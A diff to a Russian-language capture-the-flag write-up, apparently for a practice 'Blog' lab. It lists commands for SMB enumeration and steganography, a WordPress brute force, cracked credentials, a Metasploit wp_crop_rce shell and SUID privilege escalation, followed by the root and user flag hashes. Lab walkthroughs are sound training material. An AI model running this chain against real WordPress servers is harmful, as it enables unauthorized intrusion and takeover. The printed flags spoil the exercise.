@@ -16,9 +16,47 @@
 ### Ответьте на вопросы ниже
 корень.txt
 ```commandline
+nmap -sC -sV <IP>
+smbclient -L //<IP>
+smbclient -L //<IP>/BillySMB
+get Alice-White-Rabbit.jpg
+get tswift.mp4 
+get check-this.png
+exit
+steghide extract -sf Alice-White-Rabbit.jpg
+cat rabbit_hole.txt
+zbarimg -q --raw check-this.png
+
+vim /etc/hosts
+blog.thm 10.10.10.32
+
+wpscan --url http://blog.thm --enumerate u
+wpscan -U users.txt -P /usr/share/wordlists/rockyou.txt --url http://blog.thm
+# kwheel / cutiepie1 
+searchsploit wordpress 5.0.0
+
+msfconsole -q
+use exploit/multi/http/wp_crop_rce
+show options
+set rhost blog.thm
+set username kwheel
+set password cutiepie1
+exploit
+shell
+SHELL=/bin/bash script -q /dev/null
+find / -type f -user root -perm -u=s 2>/dev/null
+file /usr/sbin/checker
+ltrace /usr/sbin/checker
+export admin=1
+```
+```commandline
 9a0b2b618bef9bfa7ac28c1353d9f318
 ```
 пользователь.txt
+```commandline
+find / -type f -name user.txt 2>/dev/null
+cat /media/usb/user.txt
+```
 ```commandline
 c8421899aae571f7af486492b71a8ab7
 ```
